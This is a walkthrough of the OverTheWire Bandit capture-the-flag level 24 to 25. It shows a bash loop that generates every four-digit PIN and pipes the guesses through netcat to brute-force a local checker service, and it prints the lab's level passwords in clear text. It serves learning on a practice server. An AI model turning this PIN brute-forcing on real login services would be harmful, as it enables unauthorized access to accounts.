# ![](https://overthewire.org/img/domokitten.png)

# Bandit_Level25

## Source:
- [Bandit_Level25] - The topic of Bandit, Level25.
- Netcat, grep, sort, ls, cd, cat, echo.
### I. Connect:
```sh
ssh -p 2220 bandit24@bandit.labs.overthewire.org
Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

### II. My solution:
- To pass this level, `netcat` command is necessary.

- Firstly, create a temp file in `/tmp`: `mkdir /tmp/new_file`, change directory: `cd /tmp/new_file`.

- Then create a .sh file creating 10000 case of input: `nano case.sh`
```sh
#!/bin/bash
for i in {0000..9999}
do 
  echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> input.txt
done
```
- Change permission: `chmod +x case.sh`  and Run it: `bash case.sh`.

- A new text file containing 10000 inputs appear: `input.txt`.

- To find needed response from localhost port 30002: `cat input.txt | nc localhost 30002 > result.txt`.

- After about 20 minutes, in the file `result.txt` still not have the password, `sort result.txt | uniq -c`:
```sh
      1 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
      1 Wrong! Please enter the corr
   6301 Wrong! Please enter the correct pincode. Try again.
```

####
- About 4000 inputs remain, I repeat command again: `tail -n4000 input.txt | nc localhost 30002 > result.txt`.

- Finally, I check result.txt again, `sort result.txt | uniq -c`:
```sh
      1
      1 Correct!
      1 Exiting.
      1 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
      1 The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
   3708 Wrong! Please enter the correct pincode. Try again.
```
- I found it: `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`

###
### III. Result:
The password for next level: `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`   